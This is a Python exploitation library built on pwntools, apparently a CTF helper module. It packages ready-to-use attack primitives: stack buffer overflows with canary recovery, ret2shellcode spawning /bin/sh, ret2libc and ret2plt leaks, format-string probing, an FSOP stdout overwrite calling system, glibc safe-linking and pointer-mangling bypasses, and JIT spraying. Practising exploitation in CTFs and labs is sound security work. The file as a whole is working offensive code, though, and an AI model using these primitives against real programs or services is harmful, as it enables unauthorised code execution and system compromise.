from pwn import log, context, cyclic, unpack, log, asm, flat, rol, ror, shellcraft, ROP, pwnlib
import pwn
import re
import math
from pwninit.io import *

_IOFILE_VTABLE_OFFSETS = {
    "dummy": 0x00,
    "dummy2": 0x08,
    "finish": 0x10,
    "overflow": 0x18,
    "underflow": 0x20,
    "uflow": 0x28,
    "pbackfail": 0x30,
    "xsputn": 0x38,
    "xsgetn": 0x40,
    "seekoff": 0x48,
    "seekpos": 0x50,
    "setbuf": 0x58,
    "sync": 0x60,
    "doallocate": 0x68,
    "read": 0x70,
    "write": 0x78,
    "seek": 0x80,
    "close": 0x88,
    "stat": 0x90,
    "showmanyc": 0x98,
    "imbue": 0xa0,
}

class PwnContext:    
    def __init__(self, proc, elf, libc, binary, prefix):
        self.proc = proc
        self.elf = elf
        self.libc = libc
        self.binary = binary
        self.prefix = prefix
        self._offset = None
        self._canary = None

    def resolve(self, symbol, base=None):
        """Resolve a symbol to an address, with optional offset notation (e.g., 'main+0x10')"""
        if base is None:
            base = self.elf
        if isinstance(symbol, int):
            return symbol
        elif "+" in symbol:
            func, offset = symbol.split("+")
            addr = base.sym[func] + int(offset, 0)
        elif "-" in symbol:
            func, offset = symbol.split("-")
            addr = base.sym[func] - int(offset, 0)
        else:
            addr = base.sym[symbol]
        return addr

    @property
    def canary(self):
        if not self._canary and self.proc:
            canary = 0x0
            auxv = open(f"/proc/{self.proc.pid}/auxv", "rb").read()
            word = context.bytes
            for i in range(0, len(auxv), 2 * word):
                a_type = u64(auxv[i:i+word])
                a_val  = u64(auxv[i+word:i+2*word])

                if a_type == 25:  # AT_RANDOM
                    canary = u64(b'\x00'+self.proc.readmem(a_val+1, 7))
                    break
            self._canary = canary

        return self._canary

    @canary.setter
    def canary(self, new_canary):
        self._canary = new_canary
        return self._canary

    @property
    def offset(self):
        if not self._offset:
            context.delete_corefiles = True
            io = connect()
            io.sendline(self.proc, cyclic(1000))
            io.wait()
            core = io.corefile
            self._offset = cyclic.cyclic_find(core.fault_addr)
            io.close()
            log.info(f"{self.offset = }")

        return self._offset

    @offset.setter
    def offset(self, new_offset):
        self._offset = new_offset
        return self._offset
    
    def leak(self, leak, leaked=0):
        start = leak.find(b'0x')
        end = 2

        if start > 0:
            leak = leak[start:]
            for i in leak[2:]:
                try: int(chr(i), 16); end += 1
                except: break
            leak = leak[:end]
            leak = int(leak, 16)
        else:
            word_size = context.bits//8
            leak = leak.ljust(word_size, b'\x00')[:word_size]
            leak = unpack(leak, context.bits)

        leak -= leaked
        self.check_leaks(leak)
        return leak

    
    def check_leaks(self, leak):
        if not self.proc:
            return
            
        if leak == self.canary:
            log.info(f"canary: leak = {leak:#x}")

        for m in self.proc.maps():
            if m.start <= leak <= m.end:
                base = 0
                
                if self.elf.path == m.path:
                    name = "elf"
                    base = self.proc.elf_mapping().address
                elif self.libc.path == m.path:
                    name = "libc"
                    base = self.proc.libc_mapping().address
                else:
                    name = m.path[1:-1]
                    base = getattr(self.proc, f'{name}_mapping')().address

                if base > 0 and leak != base:
                    log.info(f"{name}: leak = {leak:#x}, base = {base:#x}, diff = {leak - base}")
                    if getattr(self, name, False): getattr(self, name).address = base
                else:
                    log.info(f"{name}: leak = {leak:#x}")



    def ropchain(self, chain, ret=True, elf=None, libc=None):
        """Build a ROP chain from a dictionary of {function: [args]}"""
        elf = elf or self.elf
        libc = libc or self.libc

        elfs = []
        if elf and (not elf.pie or elf.address):
            elfs.append(elf)
        if libc and (not libc.aslr or libc.address):
            elfs.append(libc)
        rop = ROP(elfs)
        if elfs and ret:
            rop.raw(rop.ret.address)
        for func, params in chain.items():
            if '+' in func:
                f = func.split('+')
                func = resolve(f[0])+int(f[1])
            if type(params) != dict:
                rop.call(func, params)
            else:
                for value, name in rop.setRegisters(params):
                    if type(name) == pwnlib.rop.gadgets.Gadget:
                        rop.raw(name)
                    else:
                        rop.raw(value)
                rop.call(func)

        rop.raw(rop.ret.address)
        log.info(f"ROP :\n{rop.dump()}")
        return rop.chain()

    def bof(self, data, **kwargs):
        offset = self.offset
        opt = kwargs.pop("opt", {})
        bp = kwargs.pop("bp", 0)
        opt |= {self.offset - context.bytes: bp}
        if self.elf.canary:
            opt |= {offset - context.bytes * 2: self.canary}
        payload = flat({self.offset: data} | opt, **kwargs)
        send(payload)

    def ret2shellcode(self, addr, **kwargs):
        shellcode = asm(shellcraft.sh())
        if context.bits == 32:
            shellcode = asm("sub esp, 0x1000") + shellcode
        else:
            shellcode = asm("sub rsp, 0x1000") + shellcode
        padding = asm("nop") * (self.offset - context.bytes * (self.elf.canary + 1) - len(shellcode))
        addr += len(padding) // 2
        payload = self.ropchain({addr: []})
        self.bof(payload, opt={0: [padding, shellcode]}, **kwargs)

    def ret2win(self, win, params=[], **kwargs):
        addr = self.resolve(win)
        payload = self.ropchain({addr: params})
        self.bof(payload, **kwargs)

    def ret2libc(self, **kwargs):
        system = self.libc.sym["system"]
        bin_sh = next(self.libc.search(b"/bin/sh\x00"))
        payload = self.ropchain({system: [bin_sh]})
        self.bof(payload, **kwargs)

    def ret2plt(self, func="puts", ret2main="main", **kwargs):
        func_plt = self.elf.plt[func]
        func_got = self.elf.got[func]
        if ret2main:
            main = self.resolve(ret2main)
            payload = self.ropchain({func_plt: [func_got], main: []})
        else:
            payload = self.ropchain({func_plt: [func_got]})
        self.bof(payload, **kwargs)
        leak = upack(recv())
        self.libc.address = leak - self.libc.sym[func]

    def format_string(self, n=100):
        payload = "A" * context.bytes + ".%p" * n
        send(payload)
        output = recv().split(".")
        log.info(f"format string : {output}")
        return output.index("0x" + "41" * context.bytes)

    def binsh(self):
        return next(self.libc.search(b"/bin/sh\0"))
    
    def fsopsh(self, func=None, arg=b"/bin/sh\0", lock=None, file=None, trigger="xsputn"):
        if self.elf.bits != 64:
            raise NotImplementedError()

        file = file or self.libc.sym["_IO_2_1_stdout_"]
        lock = lock or file + 0x800
        func = func or self.libc.sym.system

        return flat({
            0x00: [0x3b01010101010101, arg],
            0x78: -1,
            0x88: lock, # empty zone as lock
            0x90: -1,
            0xa0: file + (0xe0 - 0xe0), # wide_data
            0xd0: func,
            0xd8: self.libc.sym["_IO_wfile_jumps"] - (_IOFILE_VTABLE_OFFSETS[trigger] - _IOFILE_VTABLE_OFFSETS["overflow"]), # vtable
            0xe0: file + (0xe0 - 0xe0) + (0xd0 - 0x68), # wide_data->vtable,
        }, filler=b"\0")

# Global instance
pwnctx = None

def set_ctx(new_ctx: PwnContext):
    global pwnctx
    pwnctx = new_ctx

def _require_ctx():
    if pwnctx is None:
        raise RuntimeError("PwnContext not initialized (call set_ctx first)")

leak = lambda *a, **k: (_require_ctx(), pwnctx.leak(*a, **k))[1]
resolve = lambda *a, **k: (_require_ctx(), pwnctx.resolve(*a, **k))[1]
check_leaks = lambda *a, **k: (_require_ctx(), pwnctx.check_leaks(*a, **k))[1]

resolve = lambda *a, **k: (_require_ctx(), pwnctx.resolve(*a, **k))[1]
check_leaks = lambda *a, **k: (_require_ctx(), pwnctx.check_leaks(*a, **k))[1]

offset = lambda *a, **k: (_require_ctx(), pwnctx.offset)[1]
canary = lambda *a, **k: (_require_ctx(), pwnctx.canary)[1]
ropchain = lambda *a, **k: (_require_ctx(), pwnctx.ropchain(*a, **k))[1]
bof = lambda *a, **k: (_require_ctx(), pwnctx.bof(*a, **k))[1]

ret2shellcode = lambda *a, **k: (_require_ctx(), pwnctx.ret2shellcode(*a, **k))[1]
ret2win = lambda *a, **k: (_require_ctx(), pwnctx.ret2win(*a, **k))[1]
ret2libc = lambda *a, **k: (_require_ctx(), pwnctx.ret2libc(*a, **k))[1]
ret2plt = lambda *a, **k: (_require_ctx(), pwnctx.ret2plt(*a, **k))[1]

format_string = lambda *a, **k: (_require_ctx(), pwnctx.format_string(*a, **k))[1]

binsh = lambda *a, **k: (_require_ctx(), pwnctx.binsh(*a, **k))[1]
fsopsh = lambda *a, **k: (_require_ctx(), pwnctx.fsopsh(*a, **k))[1]

# Utility functions
u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
upack = lambda d: pwn.unpack(d, "all")

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or len(a) == 0: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or len(b) == 0: b_ = len(d)
    return d[a_+len(a):b_]

def getr(d, p):
    return re.findall(p, d)[0]
    
def safelink_bf64(ptr):
    r"""safelink_bf64(ptr) -> int

    Recover a safelinked next pointer assuming both next & addr are in the same page
    
    Arguments:
        ptr(int): The next value
    """
    fd = 0
    for i in range(36, -1, -12):
        tmp = fd
        fd <<= 12
        fd |= (tmp ^ (ptr >> i)) & 0xfff
    if fd & 0xf != 0:
        log.warn("safelink_bf64() page differs")
    return fd

def printx(**kwargs):
    for k, v in kwargs.items():
        log.success("%s: %#x" % (k, v))

def hexdump(data, s=context.word_size//8):
    idx_max = math.ceil(math.log(len(data), 16))
    for i in range(0, len(data), s):
        log.info(f"%0{idx_max}x: %#0{2*s+2}x" % (i, u64(data[i:i+s])))

def safelink(addr, ptr):
        return (addr >> 12) ^ ptr

def ptr_mangle(addr, cookie=0):
    return rol(addr ^ cookie, 17)

def ptr_demangle(addr, cookie=0):
    return ror(addr, 17) ^ cookie

def ptr_cookie(mangled, demangled):
    return ptr_demangle(mangled, demangled)

def jitspray(code, size=8, jmp=b"\xeb\x03"):
    r"""jitspray(code, size=8, jmp=b"\\xeb\\x03") -> list

    Perform a jitspray with movabs on x64 by default.
    
    Arguments:
        code(str):  Assembler code
        size(str):  Maximum code part size (default 8 for movabs)
        jmp(str):   Stub for jumping between code parts
    """
    code = [asm(c) for c in code.splitlines()]
    size -= len(jmp)
    parts = [b""]
    for c in code:
        p = parts[-1]
        if len(p) + len(c) > size:
            parts[-1] = p.ljust(size, b"\x90") + jmp
            parts.append(c)
        else:
            parts[-1] += c
    return [u64(p) for p in parts]
